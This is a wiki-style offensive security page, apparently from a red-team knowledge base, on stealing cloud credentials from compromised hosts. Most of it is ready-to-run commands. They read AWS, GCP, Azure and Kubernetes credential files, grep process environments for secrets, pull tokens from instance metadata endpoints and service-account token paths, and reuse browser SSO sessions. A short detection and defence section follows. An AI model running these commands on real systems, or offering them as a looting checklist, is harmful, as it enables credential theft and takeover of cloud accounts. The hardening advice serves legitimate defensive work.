---
title: Stealing cloud tokens
slug: token-stealing-cloud
---

> **TL;DR:** Cloud creds live in a small set of well-known places — config files, env vars, instance metadata, browser SSO caches, CI logs, container projected volumes. Know the paths and your post-exploitation looting becomes a checklist.

## What it is
Short-lived STS/SA/MI tokens replaced long-lived keys, but they still have to land *somewhere* the SDK can read them. That somewhere is predictable per platform: dotfiles, environment, magic IP endpoints, OS keystores, browser-managed cache for SSO. On any compromised host — laptop, server, container, runner — a 60-second pass through these locations usually yields at least one valid credential.

## Preconditions / where it applies
- Local code execution on a developer workstation, build server, bastion, container, or cloud VM.
- SSRF to instance metadata (then see [[aws-instance-metadata]] and equivalents).
- Read access to CI logs/artifacts.
- Browser process / file access on a workstation logged into a cloud SSO portal.

## Technique

**Workstation looting:**
```bash
# AWS
cat ~/.aws/credentials ~/.aws/config ~/.aws/sso/cache/*.json
ls ~/.aws/cli/cache/ ~/.aws/sso/cache/    # cached STS creds (short-lived, still gold)
# GCP
cat ~/.config/gcloud/application_default_credentials.json
cat ~/.config/gcloud/credentials.db       # sqlite — refresh tokens
cat ~/.config/gcloud/access_tokens.db
# Azure
ls ~/.azure/                              # accessTokens.json (older), msal_token_cache.bin
cat ~/.azure/azureProfile.json
# Kubernetes
cat ~/.kube/config                        # may embed exec plugins that mint cloud tokens
```

**Environment & process memory:**
```bash
# Env vars on a running process
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -E '^(AWS_|AZURE_|GOOGLE_|GCP_|KUBE_)'
# Long-running shells / sudo sessions
env | grep -E 'TOKEN|SECRET|KEY'
```

**Cloud-native metadata endpoints (from inside the VM/pod):**
```bash
# AWS IMDSv2
TOKEN=$(curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" \
  http://169.254.169.254/latest/api/token)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Azure IMDS
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Container/K8s projected tokens:**
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token            # SA JWT
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token        # IRSA OIDC -> AWS STS
cat /var/run/secrets/azure/tokens/azure-identity-token             # Azure WI
```

**CI logs / artefacts:** scan job logs for `AWS_SESSION_TOKEN=`, `Bearer eyJ`, or partial-masked strings whose mask pattern leaks length. Old workflow runs often retain expired refresh material.

**Browser SSO theft:** the AWS access portal, Azure portal, and GCP console store session cookies and refresh tokens in the browser profile DB; with disk read (or DPAPI on Windows) you can re-use them headlessly. See [[aws-sso-device-code-phishing]] for the network-side variant.

## Detection and defence
- Workstations: protect dotfile dirs with `chmod 700`; encrypt with full-disk + screenlock; use OS keychain integrations not plaintext files where possible.
- Force IMDSv2 (`HttpTokens=required`), set hop-limit `1` so container escapes can't reach it.
- Audit CloudTrail / Activity / Audit Logs for credential use from new IPs or `userAgent` — short-lived tokens still leave a trail.
- Disable interactive `pull_request_target` log echoing; mask isn't enough — gate sensitive jobs behind environment protection rules.
- Block egress to `169.254.169.254` from containers that don't need it; use service-mesh-injected sidecars for legitimate access.

## References
- [AWS: IMDSv2 deep dive](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/) — token-based metadata service hardening.
- [HackTricks Cloud — Credential stealing](https://cloud.hacktricks.wiki/) — per-provider file paths and tooling.
- [SpecterOps — Browser SSO theft](https://posts.specterops.io/) — exfil of cloud session material from workstations.
